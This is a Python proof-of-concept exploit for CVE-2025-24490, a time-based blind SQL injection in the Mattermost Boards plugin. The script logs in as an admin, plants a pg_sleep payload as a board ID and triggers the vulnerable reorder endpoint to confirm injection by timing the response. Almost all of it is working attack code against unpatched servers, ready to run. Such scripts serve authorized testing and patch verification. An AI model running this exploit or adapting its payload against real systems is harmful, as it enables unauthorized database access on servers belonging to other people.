#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Boards Plugin — Blind SQL Injection via Board Reorder (Vector 2)
# CVE            : CVE-2025-24490
# Vendor         : Mattermost
# Product        : Mattermost Server (Boards / Focalboard Plugin)
# Affected       : Mattermost ≤ 10.4.1, ≤ 9.11.7; Boards Plugin ≤ v9.0.4
# Fixed          : 10.4.2, 9.11.8; Boards Plugin v9.0.5
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-24490 Vector 2 — SQL injection via reorderCategoryBoards.

The board ID (not category ID) is the injection point. The board ID is taken
from the URL path parameter and stored without validation, then concatenated
into a SQL CASE WHEN expression in category_boards.go:144.

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24490
    - https://github.com/advisories/GHSA-p4jg-qmjv-9x26
"""

import sys
import json
import time
import http.client


# ─── Configuration ──────────────────────────────────────────────────────────
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8065
ADMIN_USER = "admin"
ADMIN_PASS = "Admin123!@#"

# Time-based blind SQLi payload (34 chars, fits varchar(36))
SLEEP_SECONDS = 5
SQLI_BOARD_ID = f"'||(SELECT '' FROM pg_sleep({SLEEP_SECONDS}))||'"

DETECTION_THRESHOLD = SLEEP_SECONDS - 1


class MattermostClient:
    """Minimal Mattermost API client using only stdlib."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.token = None
        self.user_id = None
        self.team_id = None

    def _request(self, method, path, body=None, extra_headers=None):
        conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
        headers = {"Content-Type": "application/json"}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        if extra_headers:
            headers.update(extra_headers)
        data = json.dumps(body).encode() if body else None
        conn.request(method, path, body=data, headers=headers)
        resp = conn.getresponse()
        status = resp.status
        resp_headers = dict(resp.getheaders())
        raw = resp.read().decode()
        conn.close()
        try:
            resp_body = json.loads(raw) if raw else {}
        except json.JSONDecodeError:
            resp_body = {"raw": raw}
        return status, resp_headers, resp_body

    def _boards_request(self, method, path, body=None):
        return self._request(method, path, body,
                             extra_headers={"X-Requested-With": "XMLHttpRequest"})

    def login(self, username, password):
        print(f"[*] Logging in as '{username}'...")
        status, headers, body = self._request("POST", "/api/v4/users/login",
                                              {"login_id": username, "password": password})
        if status != 200:
            print(f"[-] Login failed (HTTP {status}): {body}")
            return False
        for k, v in headers.items():
            if k.lower() == "token":
                self.token = v
                break
        self.user_id = body.get("id")
        print(f"[+] Login successful! User ID: {self.user_id}")
        return True

    def get_teams(self):
        status, _, body = self._request("GET", "/api/v4/users/me/teams")
        return body if status == 200 else []

    def get_categories(self, team_id):
        path = f"/plugins/focalboard/api/v2/teams/{team_id}/categories"
        status, _, body = self._boards_request("GET", path)
        return body if status == 200 else []

    def create_category(self, team_id, name="test", category_id=None):
        """Create a board category (with optional user-controlled ID)."""
        path = f"/plugins/focalboard/api/v2/teams/{team_id}/categories"
        payload = {
            "name": name,
            "userID": self.user_id,
            "teamID": team_id,
            "type": "custom",
        }
        if category_id:
            payload["id"] = category_id
        status, _, body = self._boards_request("POST", path, payload)
        return status, body

    def add_board_to_category(self, team_id, category_id, board_id):
        """
        Add a board to a category. The board_id is a URL path parameter
        with NO validation in the vulnerable version.
        """
        # URL-encode the board_id since it contains special characters
        encoded_board_id = urllib_quote(board_id)
        path = f"/plugins/focalboard/api/v2/teams/{team_id}/categories/{category_id}/boards/{encoded_board_id}"
        status, _, body = self._boards_request("POST", path)
        return status, body

    def reorder_category_boards(self, team_id, category_id, board_ids):
        """
        Reorder boards within a category — VULNERABLE endpoint (Vector 2).
        The board IDs are concatenated into a SQL CASE WHEN expression.
        """
        path = f"/plugins/focalboard/api/v2/teams/{team_id}/categories/{category_id}/boards/reorder"
        status, _, body = self._boards_request("PUT", path, board_ids)
        return status, body

    def get_category_boards(self, team_id, category_id):
        """Get boards in a specific category."""
        categories = self.get_categories(team_id)
        for cat in categories:
            if cat["id"] == category_id:
                return cat.get("boardMetadata", []) or cat.get("boardIDs", [])
        return []


def urllib_quote(s):
    """Simple URL encoding for path components."""
    result = []
    safe = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_.-~")
    for c in s:
        if c in safe:
            result.append(c)
        else:
            result.append(f"%{ord(c):02X}")
    return "".join(result)


def exploit(target_host, target_port):
    """
    Demonstrate CVE-2025-24490 via the reorderCategoryBoards vector.

    Attack flow:
    1. Authenticate
    2. Get team ID
    3. Create a normal category (server assigns valid ID)
    4. Add a "board" with the SQL injection payload as board_id
    5. Trigger reorder with the malicious board ID
    6. Measure response time
    """
    client = MattermostClient(target_host, target_port)

    # ── Step 1: Authenticate ────────────────────────────────────────────────
    if not client.login(ADMIN_USER, ADMIN_PASS):
        return False

    # ── Step 2: Get team ID ─────────────────────────────────────────────────
    print("[*] Getting team memberships...")
    teams = client.get_teams()
    if not teams:
        print("[-] No team memberships")
        return False
    client.team_id = teams[0]["id"]
    print(f"[+] Using team: {teams[0].get('display_name', 'N/A')} ({client.team_id})")

    # ── Step 3: Create a normal category ────────────────────────────────────
    print("\n[*] Creating a clean category for board injection...")
    status, body = client.create_category(client.team_id, name="board-sqli-test")
    if status == 200:
        category_id = body.get("id", "")
        print(f"[+] Created category: {category_id}")
    else:
        print(f"[-] Category creation failed (HTTP {status}): {body}")
        # Try to use an existing custom category
        categories = client.get_categories(client.team_id)
        custom_cats = [c for c in categories if c.get("type") == "custom"
                       and "'" not in c["id"]]  # skip already-injected ones
        if custom_cats:
            category_id = custom_cats[0]["id"]
            print(f"[!] Using existing category: {category_id}")
        else:
            print("[-] No usable category found")
            return False

    # ── Step 4: Add a board with SQL injection payload as board_id ──────────
    print(f"\n[*] Adding 'board' with SQL injection payload as board_id...")
    print(f"    Payload: {SQLI_BOARD_ID}")
    print(f"    Length:  {len(SQLI_BOARD_ID)} chars (max: 36 for varchar(36))")

    status, body = client.add_board_to_category(client.team_id, category_id, SQLI_BOARD_ID)
    print(f"    Add board response: HTTP {status}")
    if status != 200:
        print(f"    Response body: {body}")
        # Some versions return errors but still store the value — continue

    # ── Step 5: Verify the board was stored ─────────────────────────────────
    print("\n[*] Listing categories to find the injected board ID...")
    categories = client.get_categories(client.team_id)
    injected_found = False
    target_cat = None
    for cat in categories:
        if cat["id"] == category_id:
            target_cat = cat
            board_metadata = cat.get("boardMetadata", [])
            if board_metadata:
                for bm in board_metadata:
                    board_id = bm.get("boardID", "")
                    if board_id == SQLI_BOARD_ID:
                        injected_found = True
                        print(f"[+] Found injected board ID in category metadata")
            # Also check boardIDs list
            board_ids_list = cat.get("boardIDs", [])
            if SQLI_BOARD_ID in (board_ids_list or []):
                injected_found = True
                print(f"[+] Found injected board ID in boardIDs list")

    if not injected_found:
        print("[!] Could not verify injected board ID in category listing")
        print(f"    Category data: {json.dumps(target_cat, indent=2) if target_cat else 'N/A'}")
        print("[!] Attempting reorder anyway...")

    # ── Step 6: Trigger SQL injection via board reorder ─────────────────────
    print(f"\n[*] Triggering SQL injection via board reorder...")
    print(f"    Endpoint: PUT /plugins/focalboard/api/v2/teams/{{teamID}}/categories/{{categoryID}}/boards/reorder")
    print(f"    Expected delay: ~{SLEEP_SECONDS} seconds")

    board_ids_to_reorder = [SQLI_BOARD_ID]
    start_time = time.time()
    status, body = client.reorder_category_boards(client.team_id, category_id, board_ids_to_reorder)
    elapsed = time.time() - start_time

    print(f"\n[*] Response received:")
    print(f"    HTTP Status:  {status}")
    print(f"    Elapsed time: {elapsed:.2f} seconds")
    if status != 200:
        print(f"    Response body: {body}")

    # ── Step 7: Analyze results ─────────────────────────────────────────────
    print("\n" + "=" * 60)
    if elapsed >= DETECTION_THRESHOLD:
        print(f"[+] SQL INJECTION CONFIRMED (Vector 2: reorderCategoryBoards)!")
        print(f"    Response was delayed by {elapsed:.2f}s (threshold: {DETECTION_THRESHOLD}s)")
        print(f"    pg_sleep({SLEEP_SECONDS}) executed in database context")
        print(f"")
        print(f"    Injection point: category_boards.go:144")
        print(f"    updateCase.When(\"'\"+boardID+\"'\", ...)")
        print("=" * 60)
        return True
    else:
        print(f"[-] SQL INJECTION NOT CONFIRMED via this vector")
        print(f"    Response took {elapsed:.2f}s (expected >= {DETECTION_THRESHOLD}s)")
        print(f"    HTTP {status}: {body}")
        print("=" * 60)
        return False


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    print("=" * 60)
    print("  CVE-2025-24490 PoC Vector 2: reorderCategoryBoards")
    print("  SQL Injection via board ID in category board reorder")
    print(f"  Target: {host}:{port}")
    print("=" * 60)
    print()
    success = exploit(host, port)
    sys.exit(0 if success else 1)
